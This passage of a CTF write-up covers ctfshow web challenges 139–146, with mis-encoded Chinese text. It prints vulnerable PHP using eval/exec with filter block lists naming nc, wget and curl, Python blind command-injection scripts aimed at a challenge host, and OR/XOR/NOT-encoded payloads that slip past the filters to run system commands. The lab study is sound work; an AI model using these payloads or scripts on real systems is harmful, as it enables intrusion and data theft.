class="line"></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure><h2 id="web139-å‘½ä»¤ç›²æ³¨"><a href="#web139-å‘½ä»¤ç›²æ³¨" class="headerlink" title="web139(å‘½ä»¤ç›²æ³¨)"></a>web139(å‘½ä»¤ç›²æ³¨)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function check($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼äºsqlçš„æ—¶é—´ç›²æ³¨ï¼Œå†™ä¸€å¥shellè¯­å¥</p><p>expï¼šæ³¨å‡ºç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line">str=string.ascii_letters+string.digits+&quot;_&#123;&#125;-&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,15):</span><br><span class="line">    key=0</span><br><span class="line">    for j in range(1,25):</span><br><span class="line">        if key==1:</span><br><span class="line">            break</span><br><span class="line">        for n in str:</span><br><span class="line">            payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)</span><br><span class="line">            print(payload)</span><br><span class="line">            url=&quot;http://6848ff5f-4aa7-49b0-b9f7-2de8346c9a36.challenge.ctf.show/?c=&quot;+payload</span><br><span class="line">            print(url)</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url,timeout=(2.5,2.5))</span><br><span class="line">            except:</span><br><span class="line">                result=result+n</span><br><span class="line">                print(result)</span><br><span class="line">                break</span><br><span class="line">            if n==&#x27;9&#x27;:</span><br><span class="line">                key=1</span><br><span class="line">                result+=&quot; &quot;</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>ç›²æ³¨å‡ºflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line">str=string.ascii_letters+string.digits+&quot;_\&#123;\&#125;-&quot;</span><br><span class="line"></span><br><span class="line">#f149</span><br><span class="line">result=&quot;&quot;</span><br><span class="line">for j in range(1,45):</span><br><span class="line">    for n in str:</span><br><span class="line">        payload=&quot;if [ `cat /f149_15_h3r3 |cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)</span><br><span class="line">        # print(payload)</span><br><span class="line">        url=&quot;http://6848ff5f-4aa7-49b0-b9f7-2de8346c9a36.challenge.ctf.show/?c=&quot;+payload</span><br><span class="line">        # print(url)</span><br><span class="line">        try:</span><br><span class="line">            requests.get(url,timeout=(2.5,2.5))</span><br><span class="line">        except:</span><br><span class="line">            result=result+n</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆæ˜¯å¼±ç±»å‹çš„é¢˜ï¼Œæˆ‘ä»¬çŸ¥é“å­—ç¬¦ä¸²è½¬intè¢«è½¬ä¸º0ï¼Œæ‰€ä»¥è®©codeä¸º0å³å¯</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1=system&amp;f2=system</span><br></pre></td></tr></table></figure><h2 id="web141"><a href="#web141" class="headerlink" title="web141(|)"></a>web141(|)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line"></span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/^\W+$/&#x27;, $v3))&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å‘½ä»¤æ‰§è¡Œä¹Ÿç”¨è¿‡ç±»ä¼¼çš„å¥—è·¯ï¼Œè¿˜è®°å¾—ç¾½å¸ˆå‚…çš„è„šæœ¬</p><p>ç”Ÿæˆå­—å…¸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$myfile = fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">if($i&lt;16)&#123;</span><br><span class="line">$hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$hex_i=dechex($i);</span><br><span class="line">&#125;</span><br><span class="line">if($j&lt;16)&#123;</span><br><span class="line">$hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$hex_j=dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">$preg = &#x27;/[a-z]|[0-9]/i&#x27;;</span><br><span class="line">if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">else&#123;</span><br><span class="line">$a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">$b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">$c=(urldecode($a)|urldecode($b));</span><br><span class="line">if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">$contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line">def action(arg):</span><br><span class="line">   s1=&quot;&quot;</span><br><span class="line">   s2=&quot;&quot;</span><br><span class="line">   for i in arg:</span><br><span class="line">       f=open(&quot;rce_or.txt&quot;,&quot;r&quot;)</span><br><span class="line">       while True:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           if t==&quot;&quot;:</span><br><span class="line">               break</span><br><span class="line">           if t[0]==i:</span><br><span class="line">               #print(i)</span><br><span class="line">               s1+=t[2:5]</span><br><span class="line">               s2+=t[6:9]</span><br><span class="line">               break</span><br><span class="line">       f.close()</span><br><span class="line">   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;</span><br><span class="line">   return(output)</span><br><span class="line">   </span><br><span class="line">while True:</span><br><span class="line">   param=action(input(&quot;\n[+] your functionï¼š&quot;) )+action(input(&quot;[+] your commandï¼š&quot;))+&quot;;&quot;</span><br><span class="line">   print(param)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=2&amp;v3=/(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;);</span><br></pre></td></tr></table></figure><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    if(is_numeric($v1))&#123;</span><br><span class="line">        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);</span><br><span class="line">        sleep($d);</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸è®©ä»–ä¼‘çœ å³å¯</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=0</span><br></pre></td></tr></table></figure><h2 id="web143"><a href="#web143" class="headerlink" title="web143(^)"></a>web143(^)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;, $v3))&#123;</span><br><span class="line">                die(&#x27;get out hacker!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸web141ç±»ä¼¼è¿™æ¬¡ä½¿ç”¨^æ“ä½œï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹phpè„šæœ¬</p><p>æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=10&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0c%0c&quot;^&quot;%60%7f&quot;)*</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=10&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%21%60%60%60%60%2f%7f%60%7f&quot;)*</span><br></pre></td></tr></table></figure><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line"></span><br><span class="line">    if(is_numeric($v1) &amp;&amp; check($v3))&#123;</span><br><span class="line">        if(preg_match(&#x27;/^\W+$/&#x27;, $v2))&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check($str)&#123;</span><br><span class="line">    return strlen($str)===1?true:false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨ä¸Šä¸€è½®çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=0&amp;v2=(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%21%60%60%60%60%2f%7f%60%7f&quot;)&amp;v3=-</span><br></pre></td></tr></table></figure><h2 id="web145"><a href="#web145" class="headerlink" title="web145(~)"></a>web145(~)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;, $v3))&#123;</span><br><span class="line">                die(&#x27;get out hacker!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨~è¿ç®—ï¼Œå¯¹ä¹‹å‰çš„è„šæœ¬è¿›è¡Œå¾ˆå°çš„è°ƒæ•´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$myfile = fopen(&quot;rce_or1.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;(system)(ls);&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">if($i&lt;16)&#123;</span><br><span class="line">$hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$hex_i=dechex($i);</span><br><span class="line">&#125;</span><br><span class="line">if($j&lt;16)&#123;</span><br><span class="line">$hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$hex_j=dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">$preg = &#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;;</span><br><span class="line">if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">else&#123;</span><br><span class="line">$a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">$b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">$c=~urldecode($b);</span><br><span class="line">if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">$contents=$contents.$c.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($contents);</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line">def action(arg):</span><br><span class="line">   s1=&quot;&quot;</span><br><span class="line">   s2=&quot;&quot;</span><br><span class="line">   for i in arg:</span><br><span class="line">       f=open(&quot;rce_or1.txt&quot;,&quot;r&quot;)</span><br><span class="line">       while True:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           if t==&quot;&quot;:</span><br><span class="line">               break</span><br><span class="line">           if t[0]==i:</span><br><span class="line">               #print(i)</span><br><span class="line">               s1+=t[2:5]</span><br><span class="line">               break</span><br><span class="line">       f.close()</span><br><span class="line">   output=&quot;(\&quot;+&#x27;~&#x27;+&quot;+s1+&quot;\&quot;)&quot;</span><br><span class="line">   return(output)</span><br><span class="line">   </span><br><span class="line">while True:</span><br><span class="line">   param=action(input(&quot;\n[+] your functionï¼š&quot;) )+action(input(&quot;[+] your commandï¼š&quot;))+&quot;;&quot;</span><br><span class="line">   print(param)</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ–‡ä»¶ä½ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=2&amp;v3=?(~(%8c%86%8c%8b%9a%92))(~(%93%8c)):</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=2&amp;v3=?(~(%8c%86%8c%8b%9a%92))(~(%9c%9e%8b%df%99%93%9e%98%d1%8f%97%8f)):  </span><br></pre></td></tr></table></figure><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;, $v3))&#123;</span><br><span class="line">                die(&#x27;get out hacker!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 